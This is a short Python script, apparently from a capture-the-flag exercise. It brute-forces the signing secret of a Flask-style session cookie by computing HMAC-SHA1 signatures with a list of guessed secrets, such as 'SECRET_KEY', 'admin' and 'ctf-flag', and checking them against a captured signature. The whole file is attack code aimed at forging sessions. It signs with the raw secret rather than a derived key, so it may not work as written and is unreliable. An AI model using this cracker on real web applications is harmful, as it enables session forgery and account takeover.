
import base64
import hmac
import hashlib

original_payload = "eyJyb2xlIjoidXNlciIsInVpZCI6ImQ2Yjg4OTBmYmQzOTQ1NjBiZjk3OWRlYjVjMDVkZjc3IiwidXNlcm5hbWUiOiJhYWEifQ"
original_timestamp = "acdBtw"
original_signature = "TizbaPtvU5gyzcLdh1rrK7il3Ko"

test = [
  "flask-secret-key",
  "my-flask-secret",
  "debug",
  "debug-mode",
  "development",
  "production",
  "application",
  "appsecret",
  "app-secret",
  "secret-key",
  "SECRET_KEY",
  "SECRET",
  "key",
  "cookie-secret",
  "session-secret",
  "flask-app",
  "web",
  "webapp",
  "ctf-flag",
  "flag-is-here",
  "admin",
  "role",
  "session",
  "token",
  "jwt",
  "back",
  "backup",
]

for secret in test:
  signature = hmac.new(secret.encode(), f"{original_payload}.{original_timestamp}".encode(), hashlib.sha1)
  encoded = base64.b64encode(signature.digest()).rstrip(b'=').decode()
  if encoded == original_signature:
    print(f"MATCH FOUND! {secret}")
    exit()
  else:
    print(f"{secret}: {encoded}")
